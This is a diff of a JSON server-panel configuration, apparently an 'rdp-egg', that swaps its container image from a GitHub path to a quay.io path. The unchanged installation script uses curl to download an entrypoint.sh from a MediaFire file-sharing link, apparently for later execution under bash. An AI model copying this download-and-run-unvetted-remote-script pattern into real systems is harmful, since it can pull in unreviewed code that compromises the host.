@@ -23,7 +23,7 @@
     "scripts": {
         "installation": {
             "script": "#!\/bin\/bash\r\n# hello\r\ncd \/mnt\/server\r\ncurl https://download1496.mediafire.com/pl8th7uqtpag/dcikc3tvo6y15ve/entrypoint.sh -o entrypoint.sh\r\n\r\necho \"DARK\"",
-            "container": "github.com/BeastGamer81/rdp-egg",
+            "container": "quay.io/dark-development/rdp-egg",
             "entrypoint": "bash"
         }
     },
